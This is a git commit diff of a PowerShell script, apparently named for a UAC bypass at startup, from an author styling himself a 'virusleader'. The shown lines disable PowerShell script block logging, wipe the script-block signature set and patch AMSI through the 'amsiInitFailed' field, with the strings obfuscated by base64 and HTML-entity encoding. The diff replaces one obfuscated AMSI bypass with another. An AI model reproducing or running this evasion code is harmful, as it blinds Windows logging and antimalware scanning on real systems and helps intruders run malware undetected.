c007898ae713031d3ac83f2bad31431a429b265e
GєṭRєҡṭBȏʏ724/ <virusleader324@gmail.com>
2021-03-01 00:50:42 +0700

    Add files via upload

--- UACBStartup.ps1
+++ UACBStartup.ps1
@@ -3,10 +3,7 @@ $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
 $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
 $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
 [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
-$somengentots = ([sYSTEM.Net.WebuTILITy]::HTmldECODE('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#77;&#97;&#110;&#97;&#103;&#101;&#109;&#101;&#110;&#116;&#46;&#65;&#117;&#116;&#111;&#109;&#97;&#116;&#105;&#111;&#110;&#46;&#65;&#109;&#115;&#105;&#85;&#116;&#105;&#108;&#115;'))
-$someotherngentots = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlZl0uQXNzZW1ibHkuR2V0VHlwZQ=="))
-$someotherimportantngentots = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("J2EnKydtJysncycrJ2knKydJJysnbicrJ2knKyd0JysnRicrJ2EnKydpJysnbCcrJ2UnKydkJywnTicrJ28nKyduJysnUCcrJ3UnKydiJysnbCcrJ2knKydjLCcrJ1MnKyd0JysnYScrJ3QnKydpJysnYyc="))
-$someotherngentots($somengentots).GetField($someotherimportantngentots).SetValue($null,$true);
+[Ref].Assembly.GetType($([sYSTEM.Net.WebuTILITy]::HTmldECODE('&#83;&#121;&#115;&#116;&#101;&#109;&#46;&#77;&#97;&#110;&#97;&#103;&#101;&#109;&#101;&#110;&#116;&#46;&#65;&#117;&#116;&#111;&#109;&#97;&#116;&#105;&#111;&#110;&#46;&#65;&#109;&#115;&#105;&#85;&#116;&#105;&#108;&#115;'))).GetField(''+$([sYstEm.net.webutilIty]::hTMldECOde('&#97;&#109;&#115;&#105;'))+'InitFailed','NonPublic,Static').SetValue($null,$true);
 function MPEB {
 	param (
 		[Parameter(Mandatory = $True)]
